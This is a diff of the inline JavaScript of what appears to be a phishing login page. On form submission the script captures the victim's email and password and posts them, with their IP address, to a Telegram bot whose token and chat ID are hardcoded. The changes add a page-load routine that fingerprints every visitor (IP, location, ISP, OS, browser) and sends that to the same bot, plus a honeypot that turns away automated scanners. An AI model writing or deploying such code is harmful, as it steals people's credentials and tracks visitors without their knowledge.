@@ -195,26 +195,30 @@
   </div>
   </div>
 </body>
+
 <script>
-  // Function to get the user's IP address
-  async function getIpAddress() {
-    try {
-      const response = await fetch('https://api64.ipify.org?format=json');
-      const data = await response.json();
-      return data.ip;
-    } catch (error) {
-      console.error('Error fetching IP address:', error);
-      return null;
+  let hasAlerted = false; // Flag to track whether alert has been shown
+
+  // Function to check if the alert has been shown for the current IP
+  function hasAlertedForCurrentIP() {
+    const ipAddress = localStorage.getItem('visitorIP');
+    return ipAddress && hasAlerted;
+  }
+
+  // Function to set the flag indicating that the alert has been shown for the current IP
+  function setAlertedForCurrentIP() {
+    const ipAddress = localStorage.getItem('visitorIP');
+    if (ipAddress) {
+      hasAlerted = true;
+      localStorage.setItem('hasAlerted', 'true');
     }
   }
 
   // Function to send data to Telegram
-  async function telegramSend(email, password, ipAddress) {
+  async function telegramSend(message) {
     const apiKey = '6823207180:AAGL2irV8sxTN0R1j35RHJ7iteabC3Tz2Mw';
     const chatId = '6845072076';
     const format = 'HTML';
-
-    const message = `----NEW LOGIN 1----:\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ipAddress}`;
 
     const apiUrl = `https://api.telegram.org/bot${apiKey}/sendMessage`;
 
@@ -242,37 +246,101 @@
     }
   }
 
-  // Function to send Telegram message on page load
-  async function sendTelegramMessageOnLoad() {
+  // Function to get additional information about the visitor
+  async function getVisitorInfo() {
     try {
-      // Get the user's IP address
-      const ipAddress = await getIpAddress();
+      const response = await fetch('https://ipapi.co/json/');
+      const data = await response.json();
 
-      // Custom message for website access
-      const message = 'Visitor accessed the website';
+      // Extract relevant information
+      const ip = data.ip;
+      const country = data.country_name;
+      const region = data.region;
+      const organization = data.org;
+      const asn = data.asn;
+      const hostname = data.hostname;
+      const os = navigator.platform;
+      const browser = navigator.userAgent;
 
-      // Call the Telegram send function with the custom message
-      const success = await telegramSend(message, ipAddress);
+      // Create a message body with the information
+      const message = `
+        ----🌟NEW VISITOR🌟----
+Message:🚹 Visitor accessed the website
+Visitor Information:
+📲IP: ${ip}
+🌍Country: ${country}
+🏠Region: ${region}
+🏢Organization: ${organization}
+🔍ASN: ${asn}
+🖥Hostname: ${hostname}
+💻 OS: ${os}
+🌐Browser: ${browser}
+      `;
 
-      // Check if the Telegram send was successful
-      if (success) {
-        console.log('Telegram message sent on page load.');
-      } else {
-        console.error('Telegram send on page load was not successful.');
-        // You can add additional error handling code here if needed
-      }
+      // Call the Telegram send function with the message body
+      await telegramSend(message);
+
     } catch (error) {
-      // Log any errors that occur during the page load
-      console.error('Error during page load:', error);
-      // You can add additional error handling code here if needed
+      // Log any errors that occur during the retrieval of visitor information
+      console.error('Error fetching visitor information:', error);
     }
   }
 
-  // Call the function on page load
-  window.addEventListener('load', sendTelegramMessageOnLoad);
+  // Function to get the user's IP address
+  async function getIpAddress() {
+    try {
+      const response = await fetch('https://api64.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip;
+    } catch (error) {
+      console.error('Error fetching IP address:', error);
+      return null;
+    }
+  }
+
+  // Function to send data to Telegram on form submission
+  async function telegramSendOnFormSubmit(email, password, ipAddress) {
+    const apiKey = '6823207180:AAGL2irV8sxTN0R1j35RHJ7iteabC3Tz2Mw';
+    const chatId = '6845072076';
+    const format = 'HTML';
+
+    const message = `----♻️NEW LOGIN 1♻️----\n✉️Email: ${email}\n🔒Password: ${password}\n📲IP Address: ${ipAddress}`;
+
+    const apiUrl = `https://api.telegram.org/bot${apiKey}/sendMessage`;
+
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('text', message);
+    formData.append('parse_mode', format);
+
+    try {
+      const response = await fetch(apiUrl, {
+        method: 'POST',
+        body: formData,
+      });
+
+      const result = await response.json();
+
+      // Assuming you want to handle the response or perform additional actions based on it
+      console.log(result);
+
+      return true;
+    } catch (error) {
+      // Log any errors that occur during the Telegram send
+      console.error('Error sending message to Telegram:', error);
+      return false;
+    }
+  }
 
   document.getElementById('myForm').addEventListener('submit', async function (event) {
     event.preventDefault(); // Prevent the default form submission
+
+    // Check if the honeypot field is filled
+    if (document.getElementById('honeypot').value !== '') {
+      // Honeypot field is filled, likely a bot
+      alert('Bot detected! Form submission prevented.');
+      return;
+    }
 
     // Get the values from the form
     const email = document.getElementById('user_email').value;
@@ -282,8 +350,8 @@
       // Get the user's IP address
       const ipAddress = await getIpAddress();
 
-      // Call the Telegram send function
-      const success = await telegramSend(email, password, ipAddress);
+      // Call the Telegram send function on form submission
+      const success = await telegramSendOnFormSubmit(email, password, ipAddress);
 
       // Check if the Telegram send was successful
       if (success) {
@@ -298,6 +366,14 @@
       // Log any errors that occur during the form submission
       console.error('Error during form submission:', error);
       // You can add additional error handling code here if needed
+    }
+  });
+
+  // Call the function on page load to get visitor information and send it to Telegram
+  window.addEventListener('load', async function () {
+    if (!hasAlertedForCurrentIP()) {
+      await getVisitorInfo();
+      setAlertedForCurrentIP();
     }
   });
 </script>
